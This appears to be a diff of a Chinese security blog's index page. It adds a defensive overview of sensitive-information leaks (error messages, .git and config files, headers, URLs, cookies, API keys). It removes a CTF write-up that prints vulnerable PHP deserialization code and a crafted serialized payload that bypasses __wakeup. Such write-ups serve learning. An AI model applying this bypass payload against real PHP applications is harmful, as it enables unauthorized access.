@@ -69,6 +69,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-敏感信息泄露" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="article-date">
+  <time class="dt-published" datetime="2025-02-09T14:16:43.000Z" itemprop="datePublished">2025-02-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">敏感信息泄露</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><p>错误信息泄露<br>  概述：错误信息的过度暴露可能会向攻击者提供有价值的信息，如数据库结构、文件路径、代码逻辑等。<br>  常见情况：<br>  在开发过程中，如果捕获到异常时直接输出详细的错误信息，可能会暴露数据库查询语句、系统路径或函数堆栈等信息。<br>  示例：Warning: mysqli_connect() [function.mysqli-connect]: [error] in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 25<br>防御措施：<br>在生产环境中禁用详细错误信息的显示。<br>使用通用的错误页面，而不是直接显示错误内容。<br>配置日志系统记录错误，但只向开发者展示日志内容，避免暴露给用户。</p>
+</li>
+<li><p>文件泄露<br>  概述：敏感文件泄露是指Web应用通过某些漏洞或配置错误，暴露了服务器上的敏感文件（如配置文件、数据库备份、日志文件等）。<br>  常见文件：<br>phpinfo.php：包含了PHP的配置信息，可能泄露服务器环境、PHP版本、扩展等敏感信息。<br>.git&#x2F;目录：如果Web服务器配置不当，攻击者可以通过访问.git&#x2F;目录获取到Git仓库历史、配置文件等信息，帮助其了解系统结构。<br>config.php：如果包含数据库密码、API密钥等敏感数据，攻击者可以通过访问此文件获取凭据。<br>  备份文件（如.bak, .sql）：这些文件可能包含数据库备份，直接存储敏感信息。<br>  防御措施：<br>  禁止访问不必要的目录（如.git&#x2F;、&#x2F;var&#x2F;backups&#x2F;）。<br>  对配置文件使用严格的权限控制，避免公开敏感信息。<br>  定期清理不再使用的备份文件。<br>  在生产环境中禁用phpinfo()函数，或者限制其访问。</p>
+</li>
+<li><p>HTTP头信息泄露<br>  概述：HTTP响应头中可能包含关于Web服务器、应用框架或技术栈的信息。这些信息如果被暴露，攻击者可以利用它们推测系统的弱点。<br>  常见泄露信息：<br>  Server：包含Web服务器的类型和版本，攻击者可以通过已知漏洞推测系统。<br>  X-Powered-By：显示应用程序框架或语言的版本（如PHP、ASP.NET等）。<br>  Set-Cookie：泄露会话ID等敏感信息，攻击者可能会进行会话劫持。<br>  防御措施：<br>       配置Web服务器隐藏或修改敏感头信息（例如，通过ServerTokens和ServerSignature配置在Apache中）。<br>       禁止X-Powered-By头信息。<br>       使用安全的会话管理机制，如使用Secure和HttpOnly标志的Cookie。</p>
+</li>
+<li><p>URL中泄露敏感信息<br>  概述：通过URL参数、查询字符串或路径中传递敏感信息（如会话ID、认证信息、API密钥等）可能导致信息泄露。<br>  常见情况：<br>  将敏感信息如密码、Token、API密钥等直接放在URL中。<br>  示例：<a href="http://example.com/?user=admin&password=12345">http://example.com/?user=admin&amp;password=12345</a><br>  防御措施：<br>  避免在URL中暴露敏感信息，尽量使用POST请求传递敏感数据。<br>  对URL参数进行严格的校验，防止注入和泄漏。<br>  使用HTTPS加密通信，防止URL被嗅探。</p>
+</li>
+<li><p>Cookie信息泄露<br>  概述：Web应用在Cookie中存储的敏感信息（如会话ID、身份验证Token等）如果没有得到妥善保护，可能会被攻击者窃取或篡改。<br>  常见情况：<br>  在Cookie中存储敏感信息（如用户的认证信息、JWT Token等），并且没有使用Secure和HttpOnly标志。<br>  如果Cookie没有加密或没有采取适当的保护措施，攻击者可能通过跨站脚本（XSS）等攻击窃取Cookie。<br>  防御措施：<br>  使用Secure标志仅在HTTPS连接中传递Cookie。<br>  使用HttpOnly标志，避免JavaScript访问Cookie。<br>  使用SameSite标志来防止跨站请求伪造（CSRF）攻击。</p>
+</li>
+<li><p>数据库信息泄露<br>  概述：数据库的敏感信息（如数据库用户名、密码、表结构等）如果被泄露，攻击者可以直接攻击数据库，窃取或篡改数据。<br>  常见情况：<br>  配置文件中明文存储数据库凭证。<br>  数据库错误信息直接返回给用户，包含敏感的数据库结构或查询语句。<br>  防御措施：<br>  确保数据库凭证不直接暴露在应用代码中，使用环境变量或配置管理工具来管理敏感数据。<br>  配置Web应用和数据库的权限，确保数据库仅对授权用户可访问。<br>  使用数据库错误信息的统一处理机制，避免详细的错误信息暴露给客户端。</p>
+</li>
+<li><p>暴露的API密钥或Token<br>  概述：暴露API密钥或认证Token，尤其是通过URL、头信息或公共代码库（如GitHub）等，可能导致API滥用或账户被盗。<br>  常见情况：<br>  在公共代码库中上传包含敏感API密钥的源代码。<br>  API请求时，未对API密钥和Token做保护，导致其泄露。<br>  防御措施：<br>  不要将敏感信息（如API密钥）硬编码在代码中，使用环境变量管理密钥。<br>  使用专门的密钥管理系统（如AWS Secrets Manager，HashiCorp Vault）来保护密钥。<br>  定期轮换API密钥和Token，并限制其访问权限。</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" data-id="cm6xprclw0000o0vadlomead0" data-title="敏感信息泄露" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
@@ -521,72 +575,6 @@
 
 
   
-    <article id="[swpuctf-新生赛-no-wakeup-1" class="h-entry article article-type-[swpuctf" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/" class="article-date">
-  <time class="dt-published" datetime="2025-01-19T14:10:33.000Z" itemprop="datePublished">2025-01-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/">新生赛]no_wakeup</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>进入靶机<br> &lt;?php</p>
-<p>header(“Content-type:text&#x2F;html;charset&#x3D;utf-8”);<br>error_reporting(0);<br>show_source(“class.php”);</p>
-<p>class HaHaHa{</p>
-<pre><code>    public $admin;
-    public $passwd;
-
-    public function __construct()&#123;
-        $this-&gt;admin =&quot;user&quot;;
-        $this-&gt;passwd = &quot;123456&quot;;
-    &#125;
-
-    public function __wakeup()&#123;
-        $this-&gt;passwd = sha1($this-&gt;passwd);
-    &#125;
-
-    public function __destruct()&#123;
-        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;
-            include(&quot;flag.php&quot;);
-            echo $flag;
-        &#125;else&#123;
-            echo $this-&gt;passwd;
-            echo &quot;No wake up&quot;;
-        &#125;
-    &#125;
-&#125;
-</code></pre>
-<p>$Letmeseesee &#x3D; $_GET[‘p’];<br>unserialize($Letmeseesee);</p>
-<p>?&gt;<br>知识点：反序列化、weakup()绕过<br>在代码中我们可以发现含有sha1不可逆算法，因此考虑到绕过__weakup()函数<br>根据php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup()<br>总上述代码特征<br>构造<br>$aa &#x3D; new HaHaHa();<br>$aa-&gt;admin &#x3D; “admin”;<br>$aa-&gt;passwd &#x3D; “wllm”;<br>$stus &#x3D; serialize($aa);<br>print_r($stus);<br>运行后得到<br>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>修改一下成员个数，得<br>O:6:”HaHaHa”3::{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>上传后得到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/19/%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup-1/" data-id="cm63pev0j0000w0va8x5o9382" data-title="新生赛]no_wakeup" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -623,6 +611,10 @@
       <ul>
         
           <li>
+            <a href="/2025/02/09/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">敏感信息泄露</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
           </li>
         
@@ -636,10 +628,6 @@
         
           <li>
             <a href="/2025/02/02/2023/">2023]</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
           </li>
         
       </ul>
